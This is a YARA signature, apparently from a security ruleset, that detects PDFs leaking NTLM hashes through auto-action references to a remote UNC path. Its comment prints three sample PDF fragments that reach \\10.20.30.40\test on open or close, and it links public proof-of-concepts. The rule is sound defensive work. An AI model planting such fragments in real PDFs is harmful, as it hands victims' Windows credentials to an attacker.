/*
This signature detects Adobe PDF files that reference a remote UNC object for the purpose of leaking NTLM hashes.
New methods for NTLM hash leaks are discovered from time to time. This particular one is triggered upon opening of a
malicious crafted PDF. Original write-up from CheckPoint:

    https://research.checkpoint.com/ntlm-credentials-theft-via-pdf-files/

Public proof-of-concepts:

    https://github.com/deepzec/Bad-Pdf
    https://github.com/3gstudent/Worse-PDF

Requirements:
    /AA for Auto Action
    /O for open is functionally equivalent to /C for close.
    /S + /GoToE (Embedded) can be swapped with /GoToR (Remote).
    /D location reference.
    /F the UNC reference.

Multiple different arrangements, example one:

    /AA <<
        /O <<
            /F (\\\\10.20.30.40\\test)
            /D [ 0 /Fit]
            /S /GoToR
            >>
example two:

    /AA <<
        /C <<
            /D [ 0 /Fit]
            /S /GoToE
            /F (\\\\10.20.30.40\\test)
            >>

example three:

    /AA <<
        /O <<
            /D [ 0 /Fit]
            /F (\\\\10.20.30.40\\test)
            /S /GoToR
            >>
            
Multiple protocols supported for the /F include, both http and UNC.
*/

rule NTLM_Credential_Theft_via_PDF
{
    strings:
        // we have three regexes here so that we catch all possible orderings but still meet the requirement of all three parts.
        $badness1 = /\s*\/AA\s*<<\s*\/[OC]\s*<<((\s*\/\D\s*\[[^\]]+\])(\s*\/S\s*\/GoTo[ER])|(\s*\/S\s*\/GoTo[ER])(\s*\/\D\s*\[[^\]]+\]))\s*\/F\s*\((\\\\\\\\[a-z0-9]+\.[^\\]+\\\\[a-z0-9]+|https?:\/\/[^\)]+)\)/ nocase
        $badness2 = /\s*\/AA\s*<<\s*\/[OC]\s*<<\s*\/F\s*\((\\\\\\\\[a-z0-9]+\.[^\\]+\\\\[a-z0-9]+|https?:\/\/[^\)]+)\)((\s*\/\D\s*\[[^\]]+\])(\s*\/S\s*\/GoTo[ER])|(\s*\/S\s*\/GoTo[ER])(\s*\/\D\s*\[[^\]]+\]))/ nocase
        $badness3 = /\s*\/AA\s*<<\s*\/[OC]\s*<<((\s*\/\D\s*\[[^\]]+\])\s*\/F\s*\((\\\\\\\\[a-z0-9]+\.[^\\]+\\\\[a-z0-9]+|https?:\/\/[^\)]+)\)(\s*\/S\s*\/GoTo[ER])|(\s*\/S\s*\/GoTo[ER])\s*\/F\s*\(\\\\\\\\[a-z0-9]+.[^\\]+\\\\[a-z0-9]+\)(\s*\/\D\s*\[[^\]]+\]))/ nocase

    condition:
        for any i in (0..1024) : (uint32be(i) == 0x25504446) and any of ($badness*)
}
